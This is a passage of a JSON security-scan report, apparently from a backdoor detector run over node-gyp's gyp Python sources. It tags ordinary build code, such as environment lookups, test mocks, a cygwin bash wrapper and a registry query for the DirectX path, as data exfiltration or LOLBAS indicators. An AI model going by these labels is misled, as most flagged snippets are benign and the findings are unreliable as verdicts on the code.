                      "markdown": "`        outputs = []\n        if self.xcode_settings:\n            extra_env = self.xcode_settings.GetPerTargetSettings()\n            env = self.GetToolchainEnv(additional_settings=extra_env)\n        else:\n            env = self.GetToolchainEnv()\n        for to_copy in copies:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 835,
                  "startColumn": 18,
                  "endLine": 835,
                  "endColumn": 56,
                  "snippet": {
                    "text": "    def WriteCopies(self, copies, prebuild, mac_bundle_depends):\n        outputs = []\n        if self.xcode_settings:\n            extra_env = self.xcode_settings.GetPerTargetSettings()\n            env = self.GetToolchainEnv(additional_settings=extra_env)\n        else:\n            env = self.GetToolchainEnv()\n",
                    "rendered": {
                      "text": "    def WriteCopies(self, copies, prebuild, mac_bundle_depends):\n        outputs = []\n        if self.xcode_settings:\n            extra_env = self.xcode_settings.GetPerTargetSettings()\n            env = self.GetToolchainEnv(additional_settings=extra_env)\n        else:\n            env = self.GetToolchainEnv()\n",
                      "markdown": "`    def WriteCopies(self, copies, prebuild, mac_bundle_depends):\n        outputs = []\n        if self.xcode_settings:\n            extra_env = self.xcode_settings.GetPerTargetSettings()\n            env = self.GetToolchainEnv(additional_settings=extra_env)\n        else:\n            env = self.GetToolchainEnv()\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 741,
                  "startColumn": 45,
                  "endLine": 741,
                  "endColumn": 67,
                  "snippet": {
                    "text": "                    return path.replace(\"\\\\\", \"/\")\n                return path\n\n            inputs = [self.GypPathToNinja(i, env) for i in rule.get(\"inputs\", [])]\n\n            # If there are n source files matching the rule, and m additional rule\n            # inputs, then adding 'inputs' to each build edge written below will\n",
                    "rendered": {
                      "text": "                    return path.replace(\"\\\\\", \"/\")\n                return path\n\n            inputs = [self.GypPathToNinja(i, env) for i in rule.get(\"inputs\", [])]\n\n            # If there are n source files matching the rule, and m additional rule\n            # inputs, then adding 'inputs' to each build edge written below will\n",
                      "markdown": "`                    return path.replace(\"\\\\\", \"/\")\n                return path\n\n            inputs = [self.GypPathToNinja(i, env) for i in rule.get(\"inputs\", [])]\n\n            # If there are n source files matching the rule, and m additional rule\n            # inputs, then adding 'inputs' to each build edge written below will\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 695,
                  "startColumn": 8,
                  "endLine": 695,
                  "endColumn": 22,
                  "snippet": {
                    "text": "        mac_bundle_resources,\n        extra_mac_bundle_resources,\n    ):\n        env = self.GetToolchainEnv()\n        all_outputs = []\n        for rule in rules:\n            # Skip a rule with no action and no inputs.\n",
                    "rendered": {
                      "text": "        mac_bundle_resources,\n        extra_mac_bundle_resources,\n    ):\n        env = self.GetToolchainEnv()\n        all_outputs = []\n        for rule in rules:\n            # Skip a rule with no action and no inputs.\n",
                      "markdown": "`        mac_bundle_resources,\n        extra_mac_bundle_resources,\n    ):\n        env = self.GetToolchainEnv()\n        all_outputs = []\n        for rule in rules:\n            # Skip a rule with no action and no inputs.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/ninja.py"
                },
                "region": {
                  "startLine": 650,
                  "startColumn": 8,
                  "endLine": 650,
                  "endColumn": 22,
                  "snippet": {
                    "text": "        self, actions, extra_sources, prebuild, extra_mac_bundle_resources\n    ):\n        # Actions cd into the base directory.\n        env = self.GetToolchainEnv()\n        all_outputs = []\n        for action in actions:\n            # First write out a rule for the action.\n",
                    "rendered": {
                      "text": "        self, actions, extra_sources, prebuild, extra_mac_bundle_resources\n    ):\n        # Actions cd into the base directory.\n        env = self.GetToolchainEnv()\n        all_outputs = []\n        for action in actions:\n            # First write out a rule for the action.\n",
                      "markdown": "`        self, actions, extra_sources, prebuild, extra_mac_bundle_resources\n    ):\n        # Actions cd into the base directory.\n        env = self.GetToolchainEnv()\n        all_outputs = []\n        for action in actions:\n            # First write out a rule for the action.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/common_test.py"
                },
                "region": {
                  "startLine": 101,
                  "startColumn": 22,
                  "endLine": 101,
                  "endColumn": 27,
                  "snippet": {
                    "text": "                with patch.dict(os.environ, env):\n                    defines = gyp.common.GetCrossCompilerPredefines()\n                    flavor = gyp.common.GetFlavor({})\n                if env.get(\"CC_target\"):\n                    mock_run.assert_called_with(\n                        [\n                            *expected_cmd,\n",
                    "rendered": {
                      "text": "                with patch.dict(os.environ, env):\n                    defines = gyp.common.GetCrossCompilerPredefines()\n                    flavor = gyp.common.GetFlavor({})\n                if env.get(\"CC_target\"):\n                    mock_run.assert_called_with(\n                        [\n                            *expected_cmd,\n",
                      "markdown": "`                with patch.dict(os.environ, env):\n                    defines = gyp.common.GetCrossCompilerPredefines()\n                    flavor = gyp.common.GetFlavor({})\n                if env.get(\"CC_target\"):\n                    mock_run.assert_called_with(\n                        [\n                            *expected_cmd,\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/common_test.py"
                },
                "region": {
                  "startLine": 101,
                  "startColumn": 19,
                  "endLine": 101,
                  "endColumn": 37,
                  "snippet": {
                    "text": "                with patch.dict(os.environ, env):\n                    defines = gyp.common.GetCrossCompilerPredefines()\n                    flavor = gyp.common.GetFlavor({})\n                if env.get(\"CC_target\"):\n                    mock_run.assert_called_with(\n                        [\n                            *expected_cmd,\n",
                    "rendered": {
                      "text": "                with patch.dict(os.environ, env):\n                    defines = gyp.common.GetCrossCompilerPredefines()\n                    flavor = gyp.common.GetFlavor({})\n                if env.get(\"CC_target\"):\n                    mock_run.assert_called_with(\n                        [\n                            *expected_cmd,\n",
                      "markdown": "`                with patch.dict(os.environ, env):\n                    defines = gyp.common.GetCrossCompilerPredefines()\n                    flavor = gyp.common.GetFlavor({})\n                if env.get(\"CC_target\"):\n                    mock_run.assert_called_with(\n                        [\n                            *expected_cmd,\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSSettings_test.py"
                },
                "region": {
                  "startLine": 693,
                  "startColumn": 38,
                  "endLine": 693,
                  "endColumn": 47,
                  "snippet": {
                    "text": "        )\n\n    def testConvertToMSBuildSettings_full_synthetic(self):\n        \"\"\"Tests conversion of all the MSBuild settings.\"\"\"\n        msvs_settings = {\n            \"VCCLCompilerTool\": {\n                \"AdditionalIncludeDirectories\": \"folder1;folder2;folder3\",\n",
                    "rendered": {
                      "text": "        )\n\n    def testConvertToMSBuildSettings_full_synthetic(self):\n        \"\"\"Tests conversion of all the MSBuild settings.\"\"\"\n        msvs_settings = {\n            \"VCCLCompilerTool\": {\n                \"AdditionalIncludeDirectories\": \"folder1;folder2;folder3\",\n",
                      "markdown": "`        )\n\n    def testConvertToMSBuildSettings_full_synthetic(self):\n        \"\"\"Tests conversion of all the MSBuild settings.\"\"\"\n        msvs_settings = {\n            \"VCCLCompilerTool\": {\n                \"AdditionalIncludeDirectories\": \"folder1;folder2;folder3\",\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSSettings_test.py"
                },
                "region": {
                  "startLine": 299,
                  "startColumn": 33,
                  "endLine": 299,
                  "endColumn": 42,
                  "snippet": {
                    "text": "        )\n\n    def testValidateMSBuildSettings_settings(self):\n        \"\"\"Tests that for invalid MSBuild settings.\"\"\"\n        MSVSSettings.ValidateMSBuildSettings(\n            {\n                \"ClCompile\": {\n",
                    "rendered": {
                      "text": "        )\n\n    def testValidateMSBuildSettings_settings(self):\n        \"\"\"Tests that for invalid MSBuild settings.\"\"\"\n        MSVSSettings.ValidateMSBuildSettings(\n            {\n                \"ClCompile\": {\n",
                      "markdown": "`        )\n\n    def testValidateMSBuildSettings_settings(self):\n        \"\"\"Tests that for invalid MSBuild settings.\"\"\"\n        MSVSSettings.ValidateMSBuildSettings(\n            {\n                \"ClCompile\": {\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSSettings_test.py"
                },
                "region": {
                  "startLine": 1538,
                  "startColumn": 56,
                  "endLine": 1539,
                  "snippet": {
                    "text": "                    \"$(IntDir)$(TargetFileName).embed.manifest.resfdsf\"\n            },\n        }\n        self.maxDiff = 9999  # on failure display a long diff\n        actual_msbuild_settings = MSVSSettings.ConvertToMSBuildSettings(\n            msvs_settings, self.stderr\n        )\n        self.assertEqual(expected_msbuild_settings, actual_msbuild_settings)\n",
                    "rendered": {
                      "text": "                    \"$(IntDir)$(TargetFileName).embed.manifest.resfdsf\"\n            },\n        }\n        self.maxDiff = 9999  # on failure display a long diff\n        actual_msbuild_settings = MSVSSettings.ConvertToMSBuildSettings(\n            msvs_settings, self.stderr\n        )\n        self.assertEqual(expected_msbuild_settings, actual_msbuild_settings)\n",
                      "markdown": "`                    \"$(IntDir)$(TargetFileName).embed.manifest.resfdsf\"\n            },\n        }\n        self.maxDiff = 9999  # on failure display a long diff\n        actual_msbuild_settings = MSVSSettings.ConvertToMSBuildSettings(\n            msvs_settings, self.stderr\n        )\n        self.assertEqual(expected_msbuild_settings, actual_msbuild_settings)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSSettings_test.py"
                },
                "region": {
                  "startLine": 1136,
                  "startColumn": 56,
                  "endLine": 1137,
                  "snippet": {
                    "text": "                \"LinkIncremental\": \"false\",\n            },\n        }\n        self.maxDiff = 9999  # on failure display a long diff\n        actual_msbuild_settings = MSVSSettings.ConvertToMSBuildSettings(\n            msvs_settings, self.stderr\n        )\n        self.assertEqual(expected_msbuild_settings, actual_msbuild_settings)\n",
                    "rendered": {
                      "text": "                \"LinkIncremental\": \"false\",\n            },\n        }\n        self.maxDiff = 9999  # on failure display a long diff\n        actual_msbuild_settings = MSVSSettings.ConvertToMSBuildSettings(\n            msvs_settings, self.stderr\n        )\n        self.assertEqual(expected_msbuild_settings, actual_msbuild_settings)\n",
                      "markdown": "`                \"LinkIncremental\": \"false\",\n            },\n        }\n        self.maxDiff = 9999  # on failure display a long diff\n        actual_msbuild_settings = MSVSSettings.ConvertToMSBuildSettings(\n            msvs_settings, self.stderr\n        )\n        self.assertEqual(expected_msbuild_settings, actual_msbuild_settings)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xml_fix.py"
                },
                "region": {
                  "startLine": 40,
                  "startColumn": 11,
                  "endLine": 40,
                  "endColumn": 17,
                  "snippet": {
                    "text": "        writer.write('\"')\n    if self.childNodes:\n        writer.write(\">%s\" % newl)\n        for node in self.childNodes:\n            node.writexml(writer, indent + addindent, addindent, newl)\n        writer.write(f\"{indent}</{self.tagName}>{newl}\")\n    else:\n",
                    "rendered": {
                      "text": "        writer.write('\"')\n    if self.childNodes:\n        writer.write(\">%s\" % newl)\n        for node in self.childNodes:\n            node.writexml(writer, indent + addindent, addindent, newl)\n        writer.write(f\"{indent}</{self.tagName}>{newl}\")\n    else:\n",
                      "markdown": "`        writer.write('\"')\n    if self.childNodes:\n        writer.write(\">%s\" % newl)\n        for node in self.childNodes:\n            node.writexml(writer, indent + addindent, addindent, newl)\n        writer.write(f\"{indent}</{self.tagName}>{newl}\")\n    else:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/msvs_emulation.py"
                },
                "region": {
                  "startLine": 1227,
                  "startColumn": 68,
                  "endLine": 1227,
                  "endColumn": 72,
                  "snippet": {
                    "text": "\ndef VerifyMissingSources(sources, build_dir, generator_flags, gyp_to_ninja):\n    \"\"\"Emulate behavior of msvs_error_on_missing_sources present in the msvs\n    generator: Check that all regular source files, i.e. not created at run time,\n    exist on disk. Missing files cause needless recompilation when building via\n    VS, and we want this check to match for people/bots that build using ninja,\n    so they're not surprised when the VS build fails.\"\"\"\n",
                    "rendered": {
                      "text": "\ndef VerifyMissingSources(sources, build_dir, generator_flags, gyp_to_ninja):\n    \"\"\"Emulate behavior of msvs_error_on_missing_sources present in the msvs\n    generator: Check that all regular source files, i.e. not created at run time,\n    exist on disk. Missing files cause needless recompilation when building via\n    VS, and we want this check to match for people/bots that build using ninja,\n    so they're not surprised when the VS build fails.\"\"\"\n",
                      "markdown": "`\ndef VerifyMissingSources(sources, build_dir, generator_flags, gyp_to_ninja):\n    \"\"\"Emulate behavior of msvs_error_on_missing_sources present in the msvs\n    generator: Check that all regular source files, i.e. not created at run time,\n    exist on disk. Missing files cause needless recompilation when building via\n    VS, and we want this check to match for people/bots that build using ninja,\n    so they're not surprised when the VS build fails.\"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/msvs_emulation.py"
                },
                "region": {
                  "startLine": 934,
                  "startColumn": 14,
                  "endLine": 935,
                  "snippet": {
                    "text": "            'call \"%s\\\\setup_env.bat\" && set CYGWIN=nontsec && ' % cygwin_dir\n            + f'bash -c \"{cd} ; {bash_cmd}\"'\n        )\n        return cmd\n\n    RuleShellFlags = collections.namedtuple(\"RuleShellFlags\", [\"cygwin\", \"quote\"])\n\n    def GetRuleShellFlags(self, rule):\n",
                    "rendered": {
                      "text": "            'call \"%s\\\\setup_env.bat\" && set CYGWIN=nontsec && ' % cygwin_dir\n            + f'bash -c \"{cd} ; {bash_cmd}\"'\n        )\n        return cmd\n\n    RuleShellFlags = collections.namedtuple(\"RuleShellFlags\", [\"cygwin\", \"quote\"])\n\n    def GetRuleShellFlags(self, rule):\n",
                      "markdown": "`            'call \"%s\\\\setup_env.bat\" && set CYGWIN=nontsec && ' % cygwin_dir\n            + f'bash -c \"{cd} ; {bash_cmd}\"'\n        )\n        return cmd\n\n    RuleShellFlags = collections.namedtuple(\"RuleShellFlags\", [\"cygwin\", \"quote\"])\n\n    def GetRuleShellFlags(self, rule):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/msvs_emulation.py"
                },
                "region": {
                  "startLine": 930,
                  "startColumn": 7,
                  "endLine": 930,
                  "endColumn": 12,
                  "snippet": {
                    "text": "        args = [a.replace(\"\\\\\", \"/\").replace('\"', '\\\\\"') for a in args]\n        args = [\"'%s'\" % a.replace(\"'\", \"'\\\\''\") for a in args]\n        bash_cmd = \" \".join(args)\n        cmd = (\n            'call \"%s\\\\setup_env.bat\" && set CYGWIN=nontsec && ' % cygwin_dir\n            + f'bash -c \"{cd} ; {bash_cmd}\"'\n        )\n",
                    "rendered": {
                      "text": "        args = [a.replace(\"\\\\\", \"/\").replace('\"', '\\\\\"') for a in args]\n        args = [\"'%s'\" % a.replace(\"'\", \"'\\\\''\") for a in args]\n        bash_cmd = \" \".join(args)\n        cmd = (\n            'call \"%s\\\\setup_env.bat\" && set CYGWIN=nontsec && ' % cygwin_dir\n            + f'bash -c \"{cd} ; {bash_cmd}\"'\n        )\n",
                      "markdown": "`        args = [a.replace(\"\\\\\", \"/\").replace('\"', '\\\\\"') for a in args]\n        args = [\"'%s'\" % a.replace(\"'\", \"'\\\\''\") for a in args]\n        bash_cmd = \" \".join(args)\n        cmd = (\n            'call \"%s\\\\setup_env.bat\" && set CYGWIN=nontsec && ' % cygwin_dir\n            + f'bash -c \"{cd} ; {bash_cmd}\"'\n        )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/msvs_emulation.py"
                },
                "region": {
                  "startLine": 385,
                  "startColumn": 39,
                  "endLine": 385,
                  "endColumn": 47,
                  "snippet": {
                    "text": "        return [self.ConvertVSMacros(p, config=config) for p in includes]\n\n    def AdjustMidlIncludeDirs(self, midl_include_dirs, config):\n        \"\"\"Updates midl_include_dirs to expand VS specific paths, and adds the\n        system include dirs used for platform SDK and similar.\"\"\"\n        config = self._TargetConfig(config)\n        includes = midl_include_dirs + self.msvs_system_include_dirs[config]\n",
                    "rendered": {
                      "text": "        return [self.ConvertVSMacros(p, config=config) for p in includes]\n\n    def AdjustMidlIncludeDirs(self, midl_include_dirs, config):\n        \"\"\"Updates midl_include_dirs to expand VS specific paths, and adds the\n        system include dirs used for platform SDK and similar.\"\"\"\n        config = self._TargetConfig(config)\n        includes = midl_include_dirs + self.msvs_system_include_dirs[config]\n",
                      "markdown": "`        return [self.ConvertVSMacros(p, config=config) for p in includes]\n\n    def AdjustMidlIncludeDirs(self, midl_include_dirs, config):\n        \"\"\"Updates midl_include_dirs to expand VS specific paths, and adds the\n        system include dirs used for platform SDK and similar.\"\"\"\n        config = self._TargetConfig(config)\n        includes = midl_include_dirs + self.msvs_system_include_dirs[config]\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/msvs_emulation.py"
                },
                "region": {
                  "startLine": 373,
                  "startColumn": 34,
                  "endLine": 373,
                  "endColumn": 42,
                  "snippet": {
                    "text": "        )\n\n    def AdjustIncludeDirs(self, include_dirs, config):\n        \"\"\"Updates include_dirs to expand VS specific paths, and adds the system\n        include dirs used for platform SDK and similar.\"\"\"\n        config = self._TargetConfig(config)\n        includes = include_dirs + self.msvs_system_include_dirs[config]\n",
                    "rendered": {
                      "text": "        )\n\n    def AdjustIncludeDirs(self, include_dirs, config):\n        \"\"\"Updates include_dirs to expand VS specific paths, and adds the system\n        include dirs used for platform SDK and similar.\"\"\"\n        config = self._TargetConfig(config)\n        includes = include_dirs + self.msvs_system_include_dirs[config]\n",
                      "markdown": "`        )\n\n    def AdjustIncludeDirs(self, include_dirs, config):\n        \"\"\"Updates include_dirs to expand VS specific paths, and adds the system\n        include dirs used for platform SDK and similar.\"\"\"\n        config = self._TargetConfig(config)\n        includes = include_dirs + self.msvs_system_include_dirs[config]\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/msvs_emulation.py"
                },
                "region": {
                  "startLine": 339,
                  "startColumn": 22,
                  "endLine": 339,
                  "endColumn": 26,
                  "snippet": {
                    "text": "        \"\"\"Returns the target-specific configuration.\"\"\"\n        # There's two levels of architecture/platform specification in VS. The\n        # first level is globally for the configuration (this is what we consider\n        # \"the\" config at the gyp level, which will be something like 'Debug' or\n        # 'Release'), VS2015 and later only use this level\n        if int(self.vs_version.short_name) >= 2015:\n            return config\n",
                    "rendered": {
                      "text": "        \"\"\"Returns the target-specific configuration.\"\"\"\n        # There's two levels of architecture/platform specification in VS. The\n        # first level is globally for the configuration (this is what we consider\n        # \"the\" config at the gyp level, which will be something like 'Debug' or\n        # 'Release'), VS2015 and later only use this level\n        if int(self.vs_version.short_name) >= 2015:\n            return config\n",
                      "markdown": "`        \"\"\"Returns the target-specific configuration.\"\"\"\n        # There's two levels of architecture/platform specification in VS. The\n        # first level is globally for the configuration (this is what we consider\n        # \"the\" config at the gyp level, which will be something like 'Debug' or\n        # 'Release'), VS2015 and later only use this level\n        if int(self.vs_version.short_name) >= 2015:\n            return config\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/msvs_emulation.py"
                },
                "region": {
                  "startLine": 299,
                  "startColumn": 40,
                  "endLine": 299,
                  "endColumn": 44,
                  "snippet": {
                    "text": "        ]\n\n    def _GetAndMunge(self, field, path, default, prefix, append, map):\n        \"\"\"Retrieve a value from |field| at |path| or return |default|. If\n        |append| is specified, and the item is found, it will be appended to that\n        object instead of returned. If |map| is specified, results will be\n        remapped through |map| before being returned or appended.\"\"\"\n",
                    "rendered": {
                      "text": "        ]\n\n    def _GetAndMunge(self, field, path, default, prefix, append, map):\n        \"\"\"Retrieve a value from |field| at |path| or return |default|. If\n        |append| is specified, and the item is found, it will be appended to that\n        object instead of returned. If |map| is specified, results will be\n        remapped through |map| before being returned or appended.\"\"\"\n",
                      "markdown": "`        ]\n\n    def _GetAndMunge(self, field, path, default, prefix, append, map):\n        \"\"\"Retrieve a value from |field| at |path| or return |default|. If\n        |append| is specified, and the item is found, it will be appended to that\n        object instead of returned. If |map| is specified, results will be\n        remapped through |map| before being returned or appended.\"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/msvs_emulation.py"
                },
                "region": {
                  "startLine": 181,
                  "startColumn": 5,
                  "endLine": 181,
                  "endColumn": 13,
                  "snippet": {
                    "text": "        all_system_includes = all_system_includes & OrderedSet(system_includes)\n    if not all_system_includes:\n        return None\n    # Expand macros in all_system_includes.\n    env = GetGlobalVSMacroEnv(GetVSVersion(generator_flags))\n    expanded_system_includes = OrderedSet(\n        [ExpandMacros(include, env) for include in all_system_includes]\n",
                    "rendered": {
                      "text": "        all_system_includes = all_system_includes & OrderedSet(system_includes)\n    if not all_system_includes:\n        return None\n    # Expand macros in all_system_includes.\n    env = GetGlobalVSMacroEnv(GetVSVersion(generator_flags))\n    expanded_system_includes = OrderedSet(\n        [ExpandMacros(include, env) for include in all_system_includes]\n",
                      "markdown": "`        all_system_includes = all_system_includes & OrderedSet(system_includes)\n    if not all_system_includes:\n        return None\n    # Expand macros in all_system_includes.\n    env = GetGlobalVSMacroEnv(GetVSVersion(generator_flags))\n    expanded_system_includes = OrderedSet(\n        [ExpandMacros(include, env) for include in all_system_includes]\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/msvs_emulation.py"
                },
                "region": {
                  "startLine": 139,
                  "startColumn": 7,
                  "endLine": 139,
                  "endColumn": 12,
                  "snippet": {
                    "text": "    dxsdk_dir = os.environ.get(\"DXSDK_DIR\")\n    if not dxsdk_dir:\n        # Setup params to pass to and attempt to launch reg.exe.\n        cmd = [\"reg.exe\", \"query\", r\"HKLM\\Software\\Microsoft\\DirectX\", \"/s\"]\n        p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n        stdout = p.communicate()[0].decode(\"utf-8\")\n        for line in stdout.splitlines():\n",
                    "rendered": {
